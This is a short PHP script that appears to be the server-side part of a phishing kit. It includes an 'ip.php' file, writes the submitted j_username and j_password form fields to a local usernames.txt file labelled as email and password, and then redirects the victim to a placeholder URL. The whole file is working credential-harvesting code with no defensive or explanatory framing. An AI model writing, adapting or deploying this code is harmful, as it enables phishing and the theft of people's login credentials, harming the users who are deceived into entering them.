<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['j_username'] . " [PASS]: " . $_POST['j_password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();

